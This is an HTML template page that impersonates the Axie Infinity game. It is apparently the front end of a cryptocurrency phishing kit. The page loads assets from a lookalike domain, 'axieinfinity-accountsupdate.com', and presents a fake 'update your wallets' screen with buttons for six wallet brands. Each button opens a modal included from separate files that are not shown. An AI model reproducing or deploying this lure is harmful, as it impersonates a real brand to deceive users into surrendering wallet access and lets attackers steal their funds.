<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">

    <title>Axie Infinity</title>

    <script src="https://unpkg.com/feather-icons"></script>

    <style>
        body {
            background-color: #101426;
        }
        /*! CSS Used from: https://axieinfinity-accountsupdate.com/mini_lib/css/bootstrap.css */
        *,*::before,*::after{box-sizing:border-box;}
        h5{margin-top:0;margin-bottom:0.5rem;}
        p{margin-top:0;margin-bottom:1rem;}
        img{vertical-align:middle;border-style:none;}
        button{border-radius:0;}
        button:focus{outline:1px dotted;outline:5px auto -webkit-focus-ring-color;}
        button{margin:0;font-family:inherit;font-size:inherit;line-height:inherit;}
        button{overflow:visible;}
        button{text-transform:none;}
        button{-webkit-appearance:button;}
        button::-moz-focus-inner{padding:0;border-style:none;}
        h5{margin-bottom:0.5rem;font-family:inherit;font-weight:500;line-height:1.2;color:inherit;}
        h5{font-size:1.25rem;}
        .img-fluid{max-width:100%;height:auto;}
        .container{width:100%;padding-right:15px;padding-left:15px;margin-right:auto;margin-left:auto;}
        @media (min-width: 576px){
        .container{max-width:540px;}
        }
        @media (min-width: 768px){
        .container{max-width:720px;}
        }
        @media (min-width: 992px){
        .container{max-width:960px;}
        }
        @media (min-width: 1200px){
        .container{max-width:1140px;}
        }
        .row{display:-webkit-box;display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-15px;margin-left:-15px;}
        .col-md-6,.col-md-8,.col-md-10{position:relative;width:100%;min-height:1px;padding-right:15px;padding-left:15px;}
        @media (min-width: 768px){
        .col-md-6{-webkit-box-flex:0;-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%;}
        .col-md-8{-webkit-box-flex:0;-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%;}
        .col-md-10{-webkit-box-flex:0;-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%;}
        .offset-md-1{margin-left:8.333333%;}
        .offset-md-2{margin-left:16.666667%;}
        }
        .form-control{display:block;width:100%;padding:0.375rem 0.75rem;font-size:1rem;line-height:1.5;color:#495057;background-color:#fff;background-clip:padding-box;border:1px solid #ced4da;border-radius:0.25rem;transition:border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;}
        .form-control::-ms-expand{background-color:transparent;border:0;}
        .form-control:focus{color:#495057;background-color:#fff;border-color:#80bdff;outline:0;box-shadow:0 0 0 0.2rem rgba(0, 123, 255, 0.25);}
        .form-control::-webkit-input-placeholder{color:#6c757d;opacity:1;}
        .form-control::-moz-placeholder{color:#6c757d;opacity:1;}
        .form-control:-ms-input-placeholder{color:#6c757d;opacity:1;}
        .form-control::-ms-input-placeholder{color:#6c757d;opacity:1;}
        .form-control::placeholder{color:#6c757d;opacity:1;}
        .form-control:disabled{background-color:#e9ecef;opacity:1;}
        .form-inline{display:-webkit-box;display:-ms-flexbox;display:flex;-webkit-box-orient:horizontal;-webkit-box-direction:normal;-ms-flex-flow:row wrap;flex-flow:row wrap;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}
        .btn{display:inline-block;font-weight:400;text-align:center;white-space:nowrap;vertical-align:middle;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;border:1px solid transparent;padding:0.375rem 0.75rem;font-size:1rem;line-height:1.5;border-radius:0.25rem;transition:color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;}
        .btn:hover,.btn:focus{text-decoration:none;}
        .btn:focus{outline:0;box-shadow:0 0 0 0.2rem rgba(0, 123, 255, 0.25);}
        .btn:disabled{opacity:0.65;}
        .ml-2{margin-left:0.5rem!important;}
        .mt-3{margin-top:1rem!important;}
        .mt-4{margin-top:1.5rem!important;}
        .mt-5{margin-top:3rem!important;}
        .p-2{padding:0.5rem!important;}
        .px-2{padding-right:0.5rem!important;}
        .px-2{padding-left:0.5rem!important;}
        .pb-5{padding-bottom:3rem!important;}
        .text-center{text-align:center!important;}
        .font-weight-bold{font-weight:700!important;}
        .text-white{color:#fff!important;}
        .text-dark{color:#343a40!important;}
        @media print{
        *,*::before,*::after{text-shadow:none!important;box-shadow:none!important;}
        img{page-break-inside:avoid;}
        p{orphans:3;widows:3;}
        .container{min-width:992px!important;}
        }
        /*! CSS Used from: https://axieinfinity-accountsupdate.com/css/style.css */
        *{margin:0;padding:0;-webkit-box-sizing:border-box;box-sizing:border-box;}
        .btn-icon{height:50px;width:50px;}
        .text-lightblue{color:#8F9BB3;}
        @media (min-width: 1400px){
        .container{max-width:1400px;}
        }
        @media (min-width: 1000px) and (max-width: 1400px){
        .container{max-width:990px;}
        }
        @media (min-width: 768px) and (max-width: 1000px){
        .container{max-width:760px;}
        }
        @media (min-width: 0px) and (max-width: 768px){
        .container{margin-bottom:0!important;}
        }
    </style>
  </head>
  <body>
    <div id="home">
        <div class="container pb-5">
            <div class="row">
                <div class="col-md-8 offset-md-2 text-center"><img src="https://axieinfinity-accountsupdate.com/img/axie_banner.png" alt="axie-infinity"
                        class="mt-5 img-fluid">
                    <h5 class="text-white font-weight-bold mt-4 text-center">Axie Infinity</h5>
                    <p class="text-lightblue text-center mt-4">The best way to update and manage all your wallets from a
                        single app. With our highly secure verification and integrated sytems with top wallet providers, you
                        can efficiently manage all your wallets on our app..</p>
                </div>
            </div>
            <div class="row">
                <div class="col-md-10 offset-md-1">
                    <div class="row mt-5">
                        <div class="col-md-6 px-2 mt-3">
                            <button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#trezorModal">
                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/trezorwallet.png" alt="Trezor wallet"
                                        class="btn-icon img-fluid">
                                    <div class="text-dark font-weight-bold ml-2">Trezor wallet</div>
                                </div>
                            </button>
                        </div>
                        <div class="col-md-6 px-2 mt-3"><button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#metaModal">
                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/metamaskwallet.png" alt="Meta mask wallet"
                                        class="btn-icon img-fluid">
                                    <div class="text-dark font-weight-bold ml-2">Meta mask wallet</div>
                                </div>
                            </button></div>
                        <div class="col-md-6 px-2 mt-3"><button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#roninModal">
                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/roninwallet.jpg" alt="Ronin wallet"
                                        class="btn-icon img-fluid">
                                    <div class="text-dark font-weight-bold ml-2">Ronin wallet</div>
                                </div>
                            </button></div>
                        <div class="col-md-6 px-2 mt-3"><button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#binanceModal">
                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/binancesmartchain.png"
                                        alt="Binance smart chain wallet" class="btn-icon img-fluid">
                                    <div class="text-dark font-weight-bold ml-2">Binance smart chain wallet</div>
                                </div>
                            </button></div>
                        <div class="col-md-6 px-2 mt-3"><button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#bnbModal">
                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/bnbwallet.png" alt="BNB wallet"
                                        class="btn-icon img-fluid">
                                    <div class="text-dark font-weight-bold ml-2">BNB wallet</div>
                                </div>
                            </button></div>
                        <div class="col-md-6 px-2 mt-3"><button class="btn btn-white form-control p-2" data-toggle="modal" data-target="#cryptoModal">
                                <div class="form-inline"><img src="https://axieinfinity-accountsupdate.com/img/icons/cryptowallet.png" alt="Crypto.com wallet"
                                        class="btn-icon img-fluid">
                                    <div class="text-dark font-weight-bold ml-2">Crypto.com wallet</div>
                                </div>
                            </button></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    @include('includes.trezorModal')
    @include('includes.metaModal')
    @include('includes.roninModal')
    @include('includes.binanceModal')
    @include('includes.bnbModal')
    @include('includes.cryptoModal')



    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

    <script>
      feather.replace()
    </script>
  </body>
</html>




